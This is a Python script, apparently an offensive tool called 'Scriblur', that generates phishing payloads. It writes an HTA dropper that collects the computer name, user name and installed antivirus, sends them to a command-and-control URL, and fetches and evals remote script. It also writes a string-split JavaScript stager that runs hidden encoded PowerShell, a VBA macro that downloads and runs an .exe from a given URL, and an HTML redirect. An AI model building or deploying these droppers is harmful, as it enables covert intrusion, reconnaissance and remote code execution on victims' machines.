# Default Imports
import sys, os, argparse

class scriblur:
    def __init__(self, name, c2url, c2payload, exeurl):
        self.name = name
        self.c2url = c2url
        self.c2payload = c2payload
        self.exeurl = exeurl
        
    def hta_generator(self, name, c2url):
        vHTA = "./Payloads/" + name + ".hta"
        vPAY = name + ".txt"
        try:
            hta = "<html>\n"
            hta += "<head>\n"
            hta += "<script type=text/vbs>\n"
            hta += "On Error Resume Next\n"
            hta += 'strComputer = "."\n'
            hta += r'Set oWMI = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\SecurityCenter2")'
            hta += "\n"
            hta += 'Set colItems = oWMI.ExecQuery("Select * from AntiVirusProduct")\n'
            hta += 'Set o = CreateObject("MSXML2.XMLHTTP")\n'
            hta += 'Set s = CreateObject("WScript.Shell")\n'
            hta += 'strInfo = s.expandenvironmentstrings("%COMPUTERNAME%")\n'
            hta += 'strInfo = strInfo & "%20" & s.expandenvironmentstrings("%USERNAME%")\n'
            hta += 'o.Open "GET", "'
            hta += str(c2url)
            hta += "/"
            hta += 'phonehome.html?b=" & strInfo, False\n'
            hta += "o.send\n"
            hta += "For Each objItem In colItems\n"
            hta += 'o.Open "GET", "'
            hta += str(c2url)
            hta += "/"
            hta += 'vbtest.aspx?a=" & Replace(objItem.DisplayName, " ", "%20"), False\n'
            hta += "o.send\n"
            hta += "Next\n"
            hta += 'Set scriblin = CreateObject("MSXML2.ServerXMLHTTP.6.0")\n'
            hta += 'scriblin.Open "GET", "'
            hta += str(c2url)
            hta += "/"
            hta += str(vPAY)
            hta += '", False'
            hta += "\nscriblin.send\n"
            hta += "scriblurt = scriblin.responsetext\n"
            hta += "</script>\n"
            hta += "<script type=text/javascript>eval(scriblurt);</script>\n"
            hta += "</head>\n"
            hta += "<body>\n"
            hta += "<script type=text/javascript>self.close();</script>\n"
            hta += "</body>\n"
            hta += "</html>\n"

            hf = open(vHTA, "w+")
            hf.write(hta)
            hf.close()

        except Exception as e:
            print('\n[!] Error, Unable to write .HTA Dropper.')
            print(' Yielded the following error %s' % e)

    def payload_gen(self, name, c2payload):
        vPAY = "./Payloads/" + name + ".txt"
        try:
            payload = "var a='WSc' +"
            payload += "'ript.Sh' +"
            payload += "'ell';var b = 'ne' +"
            payload += "'w Ac' + 'tiveXO' +"
            payload += "'bjec' + 't(a).Ru' +"
            payload += "'n(c);';var z='po' +"
            payload += "'wers' + 'h' +"
            payload += "'ell';var c= z +"
            payload += "'.e' + 'xe -No' +"
            payload += "'P -sta -N' +"
            payload += "'onI -W Hidd' +"
            payload += "'en -e' +"
            payload += "'x' +"
            payload += "'e' +"
            payload += "'c un' +"
            payload += "'rest' +"
            payload += "'rict' +"
            payload += "'ed -En' +"
            payload += "'c ' +"
            payload += " '"
            payload += str(c2payload)
            payload += "'"
            payload += ";eval(b);"

            pf = open(vPAY, "w+")
            pf.write(payload)
            pf.close()

        except Exception as e:
            print('\n[!] Error, Unable to write JS payload.')
            print(' Yielded the following error %s' % e)

    def macro_gen(self, name, exeurl):
        vEXE = name + ".exe"
        vMACRO = "./Payloads/" + name + ".vba"
        try:
            macro = "Sub WriteQuiggle()\n"
            macro += "Dim QuiggleFile As Integer\n"
            macro += "Dim FilePath As String\n"
            macro += "FilePath = \n"
            macro += r'"C:\temp\quiggle.vbs"'
            macro += "\nQuiggleFile = FreeFile\n"
            macro += "Open FilePath For Output as TextFile\n"
            macro += r'Print #QuiggleFile, "HTTPDownload "'
            macro += str(exeurl)
            macro += "/"
            macro += str(exeurl)
            macro += r'", "C:\temp""'
            macro += '\nPrint #QuiggleFile, "  Sub HTTPDownload( myURL, myPath )"\n'
            macro += 'Print #QuiggleFile, "    Dim i, objFile, objFSO, objHTTP, strFile, strMsg"\n'
            macro += 'Print #QuiggleFile, "	 Const ForReading = 1, ForWriting = 2, ForAppending = 8"\n'
            macro += 'Print #QuiggleFile, "    Set objFSO = CreateObject( "Scripting.FileSystemObject" )"\n'
            macro += 'Print #QuiggleFile, "    If objFSO.FolderExists( myPath ) Then"\n'
            macro += 'Print #QuiggleFile, "      strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )"\n'
            macro += r'Print #QuiggleFile, "    ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) +1 ) ) Then"'
            macro += '\nPrint #QuiggleFile, "      strFile = myPath"\n'
            macro += 'Print #QuiggleFile, "    End If"\n'
            macro += 'Print #QuiggleFile, "	   Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )"\n'
            macro += 'Print #QuiggleFile, "      Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )"\n'
            macro += 'Print #QuiggleFile, "      objHTTP.Open "GET", myURL, False"\n'
            macro += 'Print #QuiggleFile, "      objHTTP.Send"\n'
            macro += 'Print #QuiggleFile, "      For i = 1 to LenB( objHTTP.ResponseBody )"\n'
            macro += 'Print #QuiggleFile, "        objFile.Write Chr(AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )"\n'
            macro += 'Print #QuiggleFile, "    Next"\n'
            macro += 'Print #QuiggleFile, "    objfile.Close()"\n'
            macro += 'Print #QuiggleFile, "    Set WshShell = wscript.CreateObject("Wscript.Shell")"\n'
            macro += 'Print #QuiggleFile, "    WshShell.Run "'
            macro += r"c:\temp"
            macro += chr(92)
            macro += str(vEXE)
            macro += '""\n'
            macro += 'Print #QuiggleFile, "    End Sub"\n'
            macro += 'Close QuiggleFile\n'
            macro += r'Shell "wscript c:\temp\quiggle.vbs"'
            macro += '\nEnd Sub\n'

            mf = open(vMACRO, "w+")
            mf.write(macro)
            mf.close()

        except Exception as e:
            print('\n[!] Error, Unable to write VBA Macro.')
            print(' Yielded the following error %s' % e)

    def redirect_gen(self, name, c2url):
        vHTML = "./Payloads/" + name + ".html"
        try:
            redirect = "<html>\n"
            redirect += "<head>\n"
            redirect += "<title>Redirect</title>\n"
            redirect += '<meta http-equiv="Refresh"\n'
            redirect += 'content="0;url='
            redirect += str(c2url)
            redirect += "/"
            redirect += str(vHTML)
            redirect += '">\n'
            redirect += "</head>\n"
            redirect += "<body>\n"
            redirect += r'<img src="#"/>'
            redirect += "\n<br>\n"
            redirect += "</body>"
            redirect += "</html>"

            rf = open(vHTML, "w+")
            rf.write(redirect)
            rf.close()

        except Exception as e:
            print('\n[!] Error, Unable to write HTML Redirect.')
            print(' Yielded the following error %s' % e)
    
    def check_dir(self, name):
        try:
            directory = './Payloads/'

            if not os.path.isdir(directory):
                os.makedirs(directory)
            else:
                pass
        except Exception as e:
            print("Error encountered... \nReview the following: " + str(e))

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-n', help='HTA payload with redirect', dest='name')
    parser.add_argument('-p', help='B64 encoded payload', dest='c2payload')
    parser.add_argument('-c', help='Client domain for whois', dest='c2url')
    parser.add_argument('-e', help='Malicious link hosting .exe', dest='exeurl')

    args = parser.parse_args()

    Scriblur = scriblur(args.name, args.c2url, args.c2payload, args.exeurl)
    Scriblur.check_dir(args.name)
    print("\n----------[Scriblur]----------")
    if not args.exeurl:
        Scriblur.hta_generator(args.name, args.c2url)
        print("\n[*] Successfully generated .hta! ")

        Scriblur.redirect_gen(args.name, args.c2url)
        print("\n[*] Successfully generated .html redirect! ")
        
        Scriblur.payload_gen(args.name, args.c2payload)
        print("\n[*] Successfully generated obfuscated payload file.")

    else:
        Scriblur.macro_gen(args.name, args.exeurl)
        print("\n[*] Successfully generated macro payload! ")
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n \033[1;31m[!] Ctrl + C Detected, Quitting...')
exit(0)